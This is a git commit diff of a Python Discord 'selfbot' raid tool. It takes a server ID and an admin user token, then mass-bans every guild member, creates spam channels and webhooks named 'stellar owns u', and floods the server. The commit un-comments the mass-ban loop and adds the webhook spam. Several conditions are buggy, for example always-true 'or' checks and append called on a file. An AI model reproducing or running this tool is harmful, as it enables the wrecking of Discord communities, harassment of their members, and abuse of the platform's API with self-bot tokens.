7d96e0b750b8a206398a9cfe2ff1f079cfe7c893
rinfys <adihadziabulic@gmail.com>
2023-12-11 20:55:09 +0100

    fixed channel spammer (stop adding threads fr)

--- main.py
+++ main.py
@@ -30,60 +30,67 @@ def main():
     """)
     choice = str(input(f"{white}[{red}END{white}] Choice >>> "))
     if choice in ["01", "1", "one"]:
-        for x in range(num_threads):
-            t = threading.Thread(target=selfbot.spamchannels)
-            t.start()
-            threads.append(t)   
-
-    for t in threads:
-        t.join()
-    if choice in ["02", "2", "two"]:
-        selfbot.banall(token)
+        selfbot.spamchannels()
 
 class selfbot:
-    def banall(token):
+    def banall():
         headers = {
             "Authorization": token,
             "Content-Type": "application/json",
         }
         members = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members-search", headers=headers).json()
         print(members)
-#        while True:
-#            for member in members:
-#                banreq = requests.put(f"https://discord.com/api/v9/guilds/{guildid}/bans/{member}", headers={"Authorization": token})
-#                if banreq.status_code in [200, 201, 204]:
-#                    print(f"{green} [+] Banned {member}")
-#                    with open("bannedmembers.txt", "a") as bannedamount:
-#                       bannedamount.append(member)
-#                elif "retry_after" in banreq.text:
-#                    time.sleep(banreq.json()['retry_after'])
-#                else:
-#                    print(f"{red}{banreq.text}")
-#                    break
+        while True:
+            for member in members:
+                banreq = requests.put(f"https://discord.com/api/v9/guilds/{guildid}/bans/{member}", headers={"Authorization": token})
+                if banreq.status_code in [200, 201, 204]:
+                    print(f"{green} [+] Banned {member}")
+                    with open("bannedmembers.txt", "a") as bannedamount:
+                       bannedamount.append(member)
+                elif "retry_after" in banreq.text:
+                    time.sleep(banreq.json()['retry_after'])
+                else:
+                    print(f"{red}{banreq.text}")
+                    break
 
-    def spamchannels():
-        yes = input(f"{white}[{red}END{white}] Are you sure? (Y or N)")
-        if yes == "Y" or "y" or "yes":
-            print(f"{white}[{red}END{white}] its joeover.")
-            time.sleep(1)
+    def webhookspam():
+        test = input(f"{white}[{red}END{white}] Webhook or SpamChannels: ")
+        if test == "Webhook" or "webhook" or "SpamChannels" or "spamchannels" or "spamchannels":
+            channel_id = input(f"{white}[{red}END{white}] Enter channel ID for webhook: ")
+            i=1
             headers = {
                 "Authorization": token,
                 "Content-Type": "application/json",
             }
-            real = {"name": "stellar owns u"} 
-            real1 = {"content": "stellar owns u"} 
-            test1 = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/preview", headers=headers)
-            if test1.status_code>205:
-                print(f"{red}[-] ERR: The guild ID doesnt exist")
-                time.sleep(3)
-                main()
-            elif test1.status_code == 200 or 201 or 202 or 203:
-                print(f"{green}[+] The guild ID exists (Continuing process)")
-                i=1
-                channelIDs = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers=headers).json()
-                for channel in [channelIDs[amount : amount + 3] for amount in range(0, len(channelIDs), 3)]:
-                    for channel in channel:
-                        spam_channels = requests.post(f"https://discord.com/api/v9/channels/1179827705672376421/messages", json=real1, headers=headers)
+            real12 = {"name": "stellar owns u"}
+            spam = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/webhooks", headers=headers, json=real12)
+            if spam.status_code == 201:
+                print(f"{green}[+] Created webhook")
+            else:
+                print(f"{red}[-] Ran into a error and avoiding it")
+                while spam.status_code<201:
+                    spam = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/webhooks", headers=headers, json=real12)
+                    print(f"{green}[+] Created webhook")
+                    
+    def spamchannels():
+            yes = input(f"{white}[{red}END{white}] Are you sure? (Y or N)")
+            if yes == "Y" or "y" or "yes":
+                print(f"{white}[{red}END{white}] its joeover.")
+                time.sleep(1)
+                headers = {
+                    "Authorization": token,
+                    "Content-Type": "application/json",
+                }
+                real = {"name": "stellar owns u"} 
+                test1 = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/preview", headers=headers)
+                if test1.status_code>205:
+                    print(f"{red}[-] ERR: The guild ID doesnt exist")
+                    time.sleep(3)
+                    main()
+                elif test1.status_code == 200 or 201 or 202 or 203:
+                    print(f"{green}[+] The guild ID exists (Continuing process)")
+                    i=1
+                    while i<10:
                         spam = requests.post(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers=headers, json=real)
                         if spam.status_code == 201:
                             print(f"{green}[+] Created channel")
@@ -91,7 +98,6 @@ class selfbot:
                             while spam.status_code<201:
                                 spam = requests.post(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers=headers, json=real)
                                 print(f"{green}[+] Trying to create")
-        print("Banning")
 
 guildid = input(f"{white}[{red}END{white}] Server ID: ")
 token = input(f"{white}[{red}END{white}] Enter selfbot token (must have admin in server): ")
